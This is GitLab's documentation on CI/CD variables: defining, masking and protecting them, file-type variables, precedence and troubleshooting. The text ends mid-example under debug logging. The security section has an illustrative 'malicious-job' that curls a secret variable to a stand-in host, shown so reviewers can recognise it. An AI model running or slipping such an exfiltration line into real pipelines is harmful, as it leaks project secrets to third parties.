---
stage: Verify
group: Pipeline Authoring
info: To determine the technical writer assigned to the Stage/Group associated with this page, see https://handbook.gitlab.com/handbook/product/ux/technical-writing/#assignments
---

# GitLab CI/CD variables

DETAILS:
**Tier:** Free, Premium, Ultimate
**Offering:** GitLab.com, Self-managed, GitLab Dedicated

CI/CD variables are a type of environment variable. You can use them to:

- Control the behavior of jobs and [pipelines](../pipelines/index.md).
- Store values you want to re-use.
- Avoid hard-coding values in your `.gitlab-ci.yml` file.

You can [override variable values](#cicd-variable-precedence) for a specific pipeline when you [run a pipeline manually](../pipelines/index.md#run-a-pipeline-manually), [run a manual job](../jobs/index.md#specifying-variables-when-running-manual-jobs),
or have them [prefilled in manual pipelines](../pipelines/index.md#prefill-variables-in-manual-pipelines).

Variable names are limited by the [shell the runner uses](https://docs.gitlab.com/runner/shells/index.html)
to execute scripts. Each shell has its own set of reserved variable names.

To ensure consistent behavior, you should always put variable values in single or double quotes.
Variables are internally parsed by the [Psych YAML parser](https://docs.ruby-lang.org/en/master/Psych.html),
so quoted and unquoted variables might be parsed differently. For example, `VAR1: 012345`
is interpreted as an octal value, so the value becomes `5349`, but `VAR1: "012345"` is parsed
as a string with a value of `012345`.

For more information about advanced use of GitLab CI/CD, see [7 advanced GitLab CI workflow hacks](https://about.gitlab.com/webcast/7cicd-hacks/) shared by GitLab engineers.

## Predefined CI/CD variables

GitLab CI/CD makes a set of [predefined CI/CD variables](predefined_variables.md)
available for use in pipeline configuration and job scripts. These variables contain
information about the job, pipeline, and other values you might need when the pipeline
is triggered or running.

You can use predefined CI/CD variables in your `.gitlab-ci.yml` without declaring them first.
For example:

```yaml
job1:
  stage: test
  script:
    - echo "The job's stage is '$CI_JOB_STAGE'"
```

The script in this example outputs `The job's stage is 'test'`.

## Define a CI/CD variable in the `.gitlab-ci.yml` file

To create a CI/CD variable in the `.gitlab-ci.yml` file, define the variable and
value with the [`variables`](../yaml/index.md#variables) keyword.

Variables saved in the `.gitlab-ci.yml` file are visible to all users with access to
the repository, and should store only non-sensitive project configuration. For example,
the URL of a database saved in a `DATABASE_URL` variable. Sensitive variables containing values
like secrets or keys should be [stored in project settings](#define-a-cicd-variable-in-the-ui).

You can use `variables` in a job or at the top level of the `.gitlab-ci.yml` file.
If the variable is defined:

- At the top level, it's globally available and all jobs can use it.
- In a job, only that job can use it.

For example:

```yaml
variables:
  GLOBAL_VAR: "A global variable"

job1:
  variables:
    JOB_VAR: "A job variable"
  script:
    - echo "Variables are '$GLOBAL_VAR' and '$JOB_VAR'"

job2:
  script:
    - echo "Variables are '$GLOBAL_VAR' and '$JOB_VAR'"
```

In this example:

- `job1` outputs `Variables are 'A global variable' and 'A job variable'`
- `job2` outputs `Variables are 'A global variable' and ''`

Use the [`value` and `description`](../yaml/index.md#variablesdescription) keywords
to define [variables that are prefilled](../pipelines/index.md#prefill-variables-in-manual-pipelines)
for [manually-triggered pipelines](../pipelines/index.md#run-a-pipeline-manually).

### Skip global variables in a single job

If you don't want globally defined variables to be available in a job, set `variables`
to `{}`:

```yaml
variables:
  GLOBAL_VAR: "A global variable"

job1:
  variables: {}
  script:
    - echo This job does not need any variables
```

## Define a CI/CD variable in the UI

Sensitive variables like tokens or passwords should be stored in the settings in the UI,
not [in the `.gitlab-ci.yml` file](#define-a-cicd-variable-in-the-gitlab-ciyml-file).
Define CI/CD variables in the UI:

- For a project [in the project's settings](#for-a-project).
- For all projects in a group [in the group's setting](#for-a-group).
- For all projects in a GitLab instance [in the instance's settings](#for-an-instance).

Alternatively, these variables can be added by using the API:

- [With the project-level variables API endpoint](../../api/project_level_variables.md).
- [With the group-level variables API endpoint](../../api/group_level_variables.md).
- [With the instance-level variables API endpoint](../../api/instance_level_ci_variables.md).

By default, pipelines from forked projects can't access the CI/CD variables available to the parent project.
If you [run a merge request pipeline in the parent project for a merge request from a fork](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project),
all variables become available to the pipeline.

### For a project

> - [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/362227) in GitLab 15.7, projects can define a maximum of 200 CI/CD variables.
> - [Updated](https://gitlab.com/gitlab-org/gitlab/-/issues/373289) in GitLab 15.9, projects can define a maximum of 8000 CI/CD variables.

You can add CI/CD variables to a project's settings.

Prerequisites:

- You must be a project member with the Maintainer role.

To add or update variables in the project settings:

1. On the left sidebar, select **Search or go to** and find your project.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: No limitations.
   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
   - **Environment scope**: Optional. **All (default)** (`*`), a specific [environment](../environments/index.md#types-of-environments),
     or a wildcard [environment scope](../environments/index.md#limit-the-environment-scope-of-a-cicd-variable).
   - **Protect variable** Optional. If selected, the variable is only available
     in pipelines that run on [protected branches](../../user/project/repository/branches/protected.md) or [protected tags](../../user/project/protected_tags.md).
   - **Visibility**:
      - **Visible**: The variable's **Value** is visible in job logs and shown in variables settings.
      - **Masked**: The variable's **Value** is masked in job logs, but it is still shown in variables settings.
        The variable fails to save if the value does not meet the [masking requirements](#mask-a-cicd-variable).
      - **Masked and hidden**: The variable's **Value** is masked in job logs, and it will not be shown in variables settings.
        The variable fails to save if the value does not meet the [masking requirements](#mask-a-cicd-variable).

After you create a variable, you can use it in the pipeline configuration
or in [job scripts](#use-cicd-variables-in-job-scripts).

### For a group

> - [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/362227) in GitLab 15.7, groups can define a maximum of 200 CI/CD variables.
> - [Updated](https://gitlab.com/gitlab-org/gitlab/-/issues/373289) in GitLab 15.9, groups can define a maximum of 30000 CI/CD variables.

You can make a CI/CD variable available to all projects in a group.

Prerequisites:

- You must be a group member with the Owner role.

To add a group variable:

1. On the left sidebar, select **Search or go to** and find your group.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: No limitations.
   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
   - **Protect variable** Optional. If selected, the variable is only available
     in pipelines that run on protected branches or tags.
   - **Visibility**:
      - **Visible**: The variable's **Value** is visible in job logs and shown in variables settings.
      - **Masked**: The variable's **Value** is masked in job logs, but it is still shown in variables settings.
        The variable fails to save if the value does not meet the [masking requirements](#mask-a-cicd-variable).
      - **Masked and hidden**: The variable's **Value** is masked in job logs, and it will not be shown in variables settings.
        The variable fails to save if the value does not meet the [masking requirements](#mask-a-cicd-variable).

The group variables that are available in a project are listed in the project's
**Settings > CI/CD > Variables** section. Variables from [subgroups](../../user/group/subgroups/index.md)
are recursively inherited.

#### Environment scope

DETAILS:
**Tier:** Premium, Ultimate

To set a group CI/CD variable to only be available for certain environments:

1. On the left sidebar, select **Search or go to** and find your group.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. To the right of the variable, select **Edit** (**{pencil}**).
1. For **Environment scope**, select **All (default)** (`*`), a specific [environment](../environments/index.md#types-of-environments),
   or a wildcard [environment scope](../environments/index.md#limit-the-environment-scope-of-a-cicd-variable).

### For an instance

DETAILS:
**Tier:** Free, Premium, Ultimate
**Offering:** Self-managed, GitLab Dedicated

You can make a CI/CD variable available to all projects and groups in a GitLab instance.

Prerequisites:

- You must have administrator access to the instance.

To add an instance variable:

1. On the left sidebar, at the bottom, select **Admin**.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: The value is limited to 10,000 characters, but also bounded by any limits in the
     runner's operating system.
   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
   - **Protect variable** Optional. If selected, the variable is only available
     in pipelines that run on protected branches or tags.
   - **Visibility**:
      - **Visible**: The variable's **Value** is visible in job logs and shown in variables settings.
      - **Masked**: The variable's **Value** is masked in job logs, but it is still shown in variables settings.
        The variable fails to save if the value does not meet the [masking requirements](#mask-a-cicd-variable).

## CI/CD variable security

Code pushed to the `.gitlab-ci.yml` file could compromise your variables. Variables could
be accidentally exposed in a job log, or maliciously sent to a third party server.

Review all merge requests that introduce changes to the `.gitlab-ci.yml` file before you:

- [Run a pipeline in the parent project for a merge request submitted from a forked project](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project).
- Merge the changes.

Review the `.gitlab-ci.yml` file of imported projects before you add files or run pipelines against them.

The following example shows malicious code in a `.gitlab-ci.yml` file:

```yaml
accidental-leak-job:
  script:                                         # Password exposed accidentally
    - echo "This script logs into the DB with $USER $PASSWORD"
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # Secret exposed maliciously
    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
```

To help reduce the risk of accidentally leaking secrets through scripts like in `accidental-leak-job`,
all variables containing sensitive information should always be [masked in job logs](#mask-a-cicd-variable).
You can also [limit a variable to protected branches and tags only](#protect-a-cicd-variable).

Alternatively, use one of the native GitLab integrations to connect with third party
secrets manager providers to store and retrieve secrets:

- [HashiCorp Vault](../secrets/index.md)
- [Azure Key Vault](../secrets/azure_key_vault.md)
- [Google Secret Manager](../secrets/gcp_secret_manager.md)

You can also use [OpenID Connect (OIDC) authentication](../secrets/id_token_authentication.md)
for secrets managers which do not have a native integration.

Malicious scripts like in `malicious-job` must be caught during the review process.
Reviewers should never trigger a pipeline when they find code like this, because
malicious code can compromise both masked and protected variables.

Variable values are encrypted using [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
and stored in the database. This data can only be read and decrypted with a
valid [secrets file](../../administration/backup_restore/troubleshooting_backup_gitlab.md#when-the-secrets-file-is-lost).

### Mask a CI/CD variable

WARNING:
Masking a CI/CD variable is not a guaranteed way to prevent malicious users from
accessing variable values. To ensure security of sensitive information,
consider using [external secrets](../secrets/index.md) and [file type variables](#use-file-type-cicd-variables)
to prevent commands such as `env`/`printenv` from printing secret variables.

You can mask a project, group, or instance CI/CD variable so the value of the variable
does not display in job logs.

Prerequisites:

- You must have the same role or access level as required to [define a CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).

To mask a variable:

1. For the group, project, or in the **Admin** area, select **Settings > CI/CD**.
1. Expand **Variables**.
1. Next to the variable you want to protect, select **Edit**.
1. Select the **Mask variable** checkbox.
1. Select **Update variable**.

The method used to mask variables [limits what can be included in a masked variable](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/13784#note_106756757).
The value of the variable must:

- Be a single line with no spaces.
- Be 8 characters or longer.
- Not match the name of an existing predefined or custom CI/CD variable.
- Not include non-alpha-numeric characters other than `@`, `_`, `-`, `:`, or `+`.

Additionally, if [variable expansion](#prevent-cicd-variable-expansion) is enabled,
the value can contain only:

- Characters from the Base64 alphabet (RFC4648).
- The `@`, `:`, `.`, or `~` characters.

Masking a variable automatically masks the value anywhere in a job log. If another
variable has the same value, that value is also masked, including when a variable
references a masked variable.

Different versions of [GitLab Runner](../runners/index.md) have different masking limitations:

| Version             | Limitations |
| ------------------- | ----------- |
| v14.1.0 and earlier | Masking of large secrets (greater than 4 KiB) could potentially be [revealed](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/28128). No sensitive URL parameter masking. |
| v14.2.0 to v15.3.0  | The tail of a large secret (greater than 4 KiB) could potentially be [revealed](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/28128). No sensitive URL parameter masking. |
| v15.7.0 and later   | Secrets could be revealed when `CI_DEBUG_SERVICES` is enabled. For details, read about [service container logging](../services/index.md#capturing-service-container-logs). |

### Protect a CI/CD variable

You can configure a project, group, or instance CI/CD variable to be available
only to pipelines that run on [protected branches](../../user/project/repository/branches/protected.md)
or [protected tags](../../user/project/protected_tags.md).

[Merged results pipelines](../pipelines/merged_results_pipelines.md) and [merge request pipelines](../pipelines/merge_request_pipelines.md) do not have access to these variables.

Prerequisites:

- You must have the same role or access level as required to [define a CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).

To set a variable as protected:

1. For the project or group, go to **Settings > CI/CD**.
1. Expand **Variables**.
1. Next to the variable you want to protect, select **Edit**.
1. Select the **Protect variable** checkbox.
1. Select **Update variable**.

The variable is available for all subsequent pipelines.

### Use file type CI/CD variables

All predefined CI/CD variables and variables defined in the `.gitlab-ci.yml` file
are "variable" type ([`variable_type` of `env_var` in the API](#define-a-cicd-variable-in-the-ui)).
Variable type variables:

- Consist of a key and value pair.
- Are made available in jobs as environment variables, with:
  - The CI/CD variable key as the environment variable name.
  - The CI/CD variable value as the environment variable value.

Project, group, and instance CI/CD variables are "variable" type by default, but can
optionally be set as a "file" type ([`variable_type` of `file` in the API](#define-a-cicd-variable-in-the-ui)).
File type variables:

- Consist of a key, value, and file.
- Are made available in jobs as environment variables, with:
  - The CI/CD variable key as the environment variable name.
  - The CI/CD variable value saved to a temporary file.
  - The path to the temporary file as the environment variable value.

Use file type CI/CD variables for tools that need a file as input. [The AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html)
and [`kubectl`](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/#the-kubeconfig-environment-variable)
are both tools that use `File` type variables for configuration.

For example, if you are using `kubectl` with:

- A variable with a key of `KUBE_URL` and `https://example.com` as the value.
- A file type variable with a key of `KUBE_CA_PEM` and a certificate as the value.

Pass `KUBE_URL` as a `--server` option, which accepts a variable, and pass `$KUBE_CA_PEM`
as a `--certificate-authority` option, which accepts a path to a file:

```shell
kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
```

WARNING:
Be careful when assigning the value of a file variable to another variable in GitLab 15.6 or older.
The other variable takes the content of the file as its value, **not** the path to the file.
In GitLab 15.7 and later, this behavior [was fixed](https://gitlab.com/gitlab-org/gitlab/-/issues/29407) and the other variable now takes the path to the file as the value.

#### Use a `.gitlab-ci.yml` variable as a file type variable

You cannot set a CI/CD variable [defined in the `.gitlab-ci.yml` file](#define-a-cicd-variable-in-the-gitlab-ciyml-file)
as a file type variable. If you have a tool that requires a file path as an input,
but you want to use a variable defined in the `.gitlab-ci.yml`:

- Run a command that saves the value of the variable in a file.
- Use that file with your tool.

For example:

```yaml
variables:
  SITE_URL: "https://gitlab.example.com"

job:
  script:
    - echo "$SITE_URL" > "site-url.txt"
    - mytool --url-file="site-url.txt"
```

## Use CI/CD variables in job scripts

All CI/CD variables are set as environment variables in the job's environment.
You can use variables in job scripts with the standard formatting for each environment's
shell.

To access environment variables, use the syntax for your [runner executor's shell](https://docs.gitlab.com/runner/executors/).

### With Bash, `sh` and similar

To access environment variables in Bash, `sh`, and similar shells, prefix the
CI/CD variable with (`$`):

```yaml
job_name:
  script:
    - echo "$CI_JOB_ID"
```

### With PowerShell

To access variables in a Windows PowerShell environment, including environment
variables set by the system, prefix the variable name with `$env:` or `$`:

```yaml
job_name:
  script:
    - echo $env:CI_JOB_ID
    - echo $CI_JOB_ID
    - echo $env:PATH
```

In [some cases](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/4115#note_157692820)
environment variables must be surrounded by quotes to expand properly:

```yaml
job_name:
  script:
    - D:\\qislsf\\apache-ant-1.10.5\\bin\\ant.bat "-DsosposDailyUsr=$env:SOSPOS_DAILY_USR" portal_test
```

### With Windows Batch

To access CI/CD variables in Windows Batch, surround the variable with `%`:

```yaml
job_name:
  script:
    - echo %CI_JOB_ID%
```

You can also surround the variable with `!` for [delayed expansion](https://ss64.com/nt/delayedexpansion.html).
Delayed expansion might be needed for variables that contain white spaces or newlines:

```yaml
job_name:
  script:
    - echo !ERROR_MESSAGE!
```

### In service containers

[Service containers](../docker/using_docker_images.md) can use CI/CD variables, but
by default can only access [variables saved in the `.gitlab-ci.yml` file](#define-a-cicd-variable-in-the-gitlab-ciyml-file).
Variables [set in the GitLab UI](#define-a-cicd-variable-in-the-ui) are not available to
service containers, because service containers are not trusted by default.

To make a UI-defined variable available in a service container, you can re-assign
it to another variable in your `.gitlab-ci.yml`:

```yaml
variables:
  SA_PASSWORD_YAML_FILE: $SA_PASSWORD_UI
```

The re-assigned variable cannot have the same name as the original variable. Otherwise it does not get expanded.

### Pass an environment variable to another job

You can create a new environment variable in a job, and pass it to another job
in a later stage. These variables cannot be used as CI/CD variables to configure a pipeline
(for example with the [`rules` keyword](../yaml/index.md#rules)), but they can be used in job scripts.

To pass a job-created environment variable to other jobs:

1. In the job script, save the variable as a `.env` file.
   - The format of the file must be one variable definition per line.
   - Each line must be formatted as: `VARIABLE_NAME=ANY VALUE HERE`.
   - Values can be wrapped in quotes, but cannot contain newline characters.
1. Save the `.env` file as an [`artifacts:reports:dotenv`](../yaml/artifacts_reports.md#artifactsreportsdotenv)
   artifact.
1. Jobs in later stages can then [use the variable in scripts](#use-cicd-variables-in-job-scripts),
   unless [jobs are configured not to receive `dotenv` variables](#control-which-jobs-receive-dotenv-variables).

For example:

```yaml
build-job:
  stage: build
  script:
    - echo "BUILD_VARIABLE=value_from_build_job" >> build.env
  artifacts:
    reports:
      dotenv: build.env

test-job:
  stage: test
  script:
    - echo "$BUILD_VARIABLE"  # Output is: 'value_from_build_job'
```

Variables from `dotenv` reports [take precedence](#cicd-variable-precedence) over
certain types of new variable definitions such as job defined variables.

You can also [pass `dotenv` variables to downstream pipelines](../pipelines/downstream_pipelines.md#pass-dotenv-variables-created-in-a-job).

#### Control which jobs receive `dotenv` variables

You can use the [`dependencies`](../yaml/index.md#dependencies) or [`needs`](../yaml/index.md#needs)
keywords to control which jobs receive the `dotenv` artifacts.

To have no environment variables from a `dotenv` artifact:

- Pass an empty `dependencies` or `needs` array.
- Pass [`needs:artifacts`](../yaml/index.md#needsartifacts) as `false`.
- Set `needs` to only list jobs that do not have a `dotenv` artifact.

For example:

```yaml
build-job1:
  stage: build
  script:
    - echo "BUILD_VERSION=v1.0.0" >> build.env
  artifacts:
    reports:
      dotenv: build.env

build-job2:
  stage: build
  needs: []
  script:
    - echo "This job has no dotenv artifacts"

test-job1:
  stage: test
  script:
    - echo "$BUILD_VERSION"  # Output is: 'v1.0.0'
  dependencies:
    - build-job1

test-job2:
  stage: test
  script:
    - echo "$BUILD_VERSION"  # Output is ''
  dependencies: []

test-job3:
  stage: test
  script:
    - echo "$BUILD_VERSION"  # Output is: 'v1.0.0'
  needs:
    - build-job1

test-job4:
  stage: test
  script:
    - echo "$BUILD_VERSION"  # Output is: 'v1.0.0'
  needs:
    - job: build-job1
      artifacts: true

test-job5:
  stage: deploy
  script:
    - echo "$BUILD_VERSION"  # Output is ''
  needs:
    - job: build-job1
      artifacts: false

test-job6:
  stage: deploy
  script:
    - echo "$BUILD_VERSION"  # Output is ''
  needs:
    - build-job2
```

### Pass an environment variable from the `script` section to another section in the same job

Use `$GITLAB_ENV` to pass environment variables defined in the `script` section to another section.

For example:

```yaml
build-job:
  stage: build
  script:
    - echo "ARCH=$(arch)" >> $GITLAB_ENV
    - touch some-file-$(arch)
  artifacts:
    paths:
      - some-file-$ARCH
```

To also reference the variable in other stages, write the variable to both the `$GITLAB_ENV` and `.env` files:

```yaml
build-job:
  stage: build
  script:
    - echo "ARCH=$(arch)" | tee >> $GITLAB_ENV build.env
    - touch some-file-$(arch)
  artifacts:
    paths:
      - some-file-$ARCH
    reports:
      dotenv: build.env

release-job:
  stage: release
  script:
    - curl --upload-file some-file-$ARCH "https://example.com/some-file-$ARCH"
```

### Store multiple values in one variable

You cannot create a CI/CD variable that is an array of values, but you
can use shell scripting techniques for similar behavior.

For example, you can store multiple values separated by a space in a variable,
then loop through the values with a script:

```yaml
job1:
  variables:
    FOLDERS: src test docs
  script:
    - |
      for FOLDER in $FOLDERS
        do
          echo "The path is root/${FOLDER}"
        done
```

## Use CI/CD variables in other variables

You can use variables inside other variables:

```yaml
job:
  variables:
    FLAGS: '-al'
    LS_CMD: 'ls "$FLAGS"'
  script:
    - 'eval "$LS_CMD"'  # Executes 'ls -al'
```

### Use the `$` character in CI/CD variables

If you do not want the `$` character interpreted as the start of another variable,
use `$$` instead:

```yaml
job:
  variables:
    FLAGS: '-al'
    LS_CMD: 'ls "$FLAGS" $$TMP_DIR'
  script:
    - 'eval "$LS_CMD"'  # Executes 'ls -al $TMP_DIR'
```

### Prevent CI/CD variable expansion

> - [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/217309) in GitLab 15.7.

Expanded variables treat values with the `$` character as a reference to another variable.
CI/CD variables are expanded by default. To treat variables with a `$` character as raw strings,
disable variable expansion for the variable

Prerequisites:

- You must have the same role or access level as required to [define a CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).

To disable variable expansion for the variable:

1. For the project or group, go to **Settings > CI/CD**.
1. Expand **Variables**.
1. Next to the variable you want to do not want expanded, select **Edit**.
1. Clear the **Expand variable** checkbox.
1. Select **Update variable**.

## CI/CD variable precedence

> - Scan Execution Policies variable precedence was [changed](https://gitlab.com/gitlab-org/gitlab/-/issues/424028) in GitLab 16.7 [with a flag](../../administration/feature_flags.md) named `security_policies_variables_precedence`. Enabled by default. [Feature flag removed in GitLab 16.8](https://gitlab.com/gitlab-org/gitlab/-/issues/435727).

You can use CI/CD variables with the same name in different places, but the values
can overwrite each other. The type of variable and where they are defined determines
which variables take precedence.

The order of precedence for variables is (from highest to lowest):

1. [Pipeline execution policy variables](../../user/application_security/policies/pipeline_execution_policies.md#cicd-variables).
1. [Scan execution policy variables](../../user/application_security/policies/scan_execution_policies.md).
1. Pipeline variables. These variables all have the same precedence:
   - [Variables passed to downstream pipelines](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline).
   - [Trigger variables](../triggers/index.md#pass-cicd-variables-in-the-api-call).
   - [Scheduled pipeline variables](../pipelines/schedules.md#add-a-pipeline-schedule).
   - [Manual pipeline run variables](../pipelines/index.md#run-a-pipeline-manually).
   - Variables added when [creating a pipeline with the API](../../api/pipelines.md#create-a-new-pipeline).
   - [Manual job variables](../jobs/index.md#specifying-variables-when-running-manual-jobs).
1. Project [variables](#for-a-project).
1. Group [variables](#for-a-group). If the same variable name exists in a
   group and its subgroups, the job uses the value from the closest subgroup. For example, if
   you have `Group > Subgroup 1 > Subgroup 2 > Project`, the variable defined in
   `Subgroup 2` takes precedence.
1. Instance [variables](#for-an-instance).
1. [Variables from `dotenv` reports](#pass-an-environment-variable-to-another-job).
1. Variables defined in jobs in the `.gitlab-ci.yml` file.
1. Variables defined outside of jobs (globally) in the `.gitlab-ci.yml` file.
1. [Deployment variables](predefined_variables.md#deployment-variables).
1. [Predefined variables](predefined_variables.md).

For example:

```yaml
variables:
  API_TOKEN: "default"

job1:
  variables:
    API_TOKEN: "secure"
  script:
    - echo "The variable is '$API_TOKEN'"
```

In this example, `job1` outputs `The variable is 'secure'` because variables defined in jobs in the `.gitlab-ci.yml` file
have higher precedence than variables defined globally in the `.gitlab-ci.yml` file.

### Override a defined CI/CD variable

You can override the value of a variable, including [predefined variables](predefined_variables.md), when you:

- [Run a pipeline manually](../pipelines/index.md#run-a-pipeline-manually) in the UI.
- Create a pipeline by using [the `pipelines` API endpoint](../../api/pipelines.md#create-a-new-pipeline).
- Use [push options](../../topics/git/commit.md#push-options-for-gitlab-cicd).
- Trigger a pipeline by using [the `triggers` API endpoint](../triggers/index.md#pass-cicd-variables-in-the-api-call).
- Pass variables to a downstream pipeline [by using the `variable` keyword](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline)
  or [by using `dotenv` variables](../pipelines/downstream_pipelines.md#pass-dotenv-variables-created-in-a-job).
- Specify variables when [running a manual job](../pipelines/index.md#run-a-pipeline-manually).

You should avoid overriding predefined variables in most cases, as it can cause the pipeline to behave unexpectedly.

### Restrict who can override variables

You can limit the ability to override variables to only users with at least the Maintainer role.
When other users try to run a pipeline with overridden variables, they receive the
`Insufficient permissions to set pipeline variables` error message.

Enable this feature by using [the projects API](../../api/projects.md#edit-project)
to enable the `restrict_user_defined_variables` setting. The setting is `disabled` by default.

If you [store your CI/CD configurations in a different repository](../../ci/pipelines/settings.md#specify-a-custom-cicd-configuration-file),
use this setting for control over the environment the pipeline runs in.

#### By minimum role

> - [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/440338) in GitLab 17.1

When the `restrict_user_defined_variables` option is enabled, you can specify which
[roles](../../user/permissions.md#roles) can override variables with the
`ci_pipeline_variables_minimum_override_role` setting.

To change the setting, use [the projects API](../../api/projects.md#edit-project)
to modify `ci_pipeline_variables_minimum_override_role` to one of:

- `owner`: Only users with the Owner role can override variables. You must have the Owner
  role for the project to change the setting to this value.
- `maintainer`: Only users with at least the Maintainer role can override variables.
  Default when not specified.
- `developer`: Only users with at least the Developer role can override variables.
- `no_one_allowed`: Users cannot override variables.

If you set the minimum role to `owner`, only users with at least the `owner` role
can update the `ci_pipeline_variables_minimum_override_role` and `restrict_user_defined_variables`
settings.

## Exporting variables

Scripts executed in separate shell contexts do not share exports, aliases,
local function definitions, or any other local shell updates.

This means that if a job fails, variables created by user-defined scripts are not
exported.

When runners execute jobs defined in `.gitlab-ci.yml`:

- Scripts specified in `before_script` and the main script are executed together in
  a single shell context, and are concatenated.
- Scripts specified in `after_script` run in a shell context completely separate to
  the `before_script` and the specified scripts.

Regardless of the shell the scripts are executed in, the runner output includes:

- Predefined variables.
- Variables defined in:
  - Instance, group, or project CI/CD settings.
  - The `.gitlab-ci.yml` file in the `variables:` section.
  - The `.gitlab-ci.yml` file in the `secrets:` section.
  - The `config.toml`.

The runner cannot handle manual exports, shell aliases, and functions executed in the body of the script, like `export MY_VARIABLE=1`.

For example, in the following `.gitlab-ci.yml` file, the following scripts are defined:

```yaml
job:
 variables:
   JOB_DEFINED_VARIABLE: "job variable"
 before_script:
   - echo "This is the 'before_script' script"
   - export MY_VARIABLE="variable"
 script:
   - echo "This is the 'script' script"
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
 after_script:
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
```

When the runner executes the job:

1. `before_script` is executed:
   1. Prints to the output.
   1. Defines the variable for `MY_VARIABLE`.
1. `script` is executed:
   1. Prints to the output.
   1. Prints the value of `JOB_DEFINED_VARIABLE`.
   1. Prints the value of `CI_COMMIT_SHA`.
   1. Prints the value of `MY_VARIABLE`.
1. `after_script` is executed in a new, separate shell context:
   1. Prints to the output.
   1. Prints the value of `JOB_DEFINED_VARIABLE`.
   1. Prints the value of `CI_COMMIT_SHA`.
   1. Prints an empty value of `MY_VARIABLE`. The variable value cannot be detected because `after_script` is in a separate shell context to `before_script`.

## Related topics

- You can configure [Auto DevOps](../../topics/autodevops/index.md) to pass CI/CD variables
  to a running application. To make a CI/CD variable available as an environment variable in the running application's container,
  [prefix the variable key](../../topics/autodevops/cicd_variables.md#configure-application-secret-variables)
  with `K8S_SECRET_`.

- The [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck)
  video is a walkthrough of the [Complex Configuration Data Monorepo](https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo)
  working example project. It explains how multiple levels of group CI/CD variables
  can be combined with environment-scoped project variables for complex configuration
  of application builds or deployments.

  The example can be copied to your own group or instance for testing. More details
  on what other GitLab CI patterns are demonstrated are available at the project page.

- You can [pass CI/CD variables to downstream pipelines](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline).
  Use [`trigger:forward` keyword](../yaml/index.md#triggerforward) to specify what type of variables
  to pass to the downstream pipeline.

## Troubleshooting

### List all variables

You can list all variables available to a script with the `export` command
in Bash or `dir env:` in PowerShell. This exposes the values of **all** available
variables, which can be a [security risk](#cicd-variable-security).
[Masked variables](#mask-a-cicd-variable) display as `[masked]`.

For example, with Bash:

```yaml
job_name:
  script:
    - export
```

Example job log output (truncated):

```shell
export CI_JOB_ID="50"
export CI_COMMIT_SHA="1ecfd275763eff1d6b4844ea3168962458c9f27a"
export CI_COMMIT_SHORT_SHA="1ecfd275"
export CI_COMMIT_REF_NAME="main"
export CI_REPOSITORY_URL="https://gitlab-ci-token:[masked]@example.com/gitlab-org/gitlab.git"
export CI_COMMIT_TAG="1.0.0"
export CI_JOB_NAME="spec:other"
export CI_JOB_STAGE="test"
export CI_JOB_MANUAL="true"
export CI_JOB_TRIGGERED="true"
export CI_JOB_TOKEN="[masked]"
export CI_PIPELINE_ID="1000"
export CI_PIPELINE_IID="10"
export CI_PAGES_DOMAIN="gitlab.io"
export CI_PAGES_URL="https://gitlab-org.gitlab.io/gitlab"
export CI_PROJECT_ID="34"
export CI_PROJECT_DIR="/builds/gitlab-org/gitlab"
export CI_PROJECT_NAME="gitlab"
export CI_PROJECT_TITLE="GitLab"
...
```

### Enable debug logging

WARNING:
Debug logging can be a serious security risk. The output contains the content of
all variables available to the job. The output is uploaded to the
GitLab server and visible in job logs.

You can use debug logging to help troubleshoot problems with pipeline configuration
or job scripts. Debug logging exposes job execution details that are usually hidden
by the runner and makes job logs more verbose. It also exposes all variables and secrets
available to the job.

Before you enable debug logging, make sure only team members
can view job logs. You should also [delete job logs](../jobs/index.md#view-jobs-in-a-pipeline)
with debug output before you make logs public again.

To enable debug logging, set the `CI_DEBUG_TRACE` variable to `true`:

```yaml
job_name:
  variables:
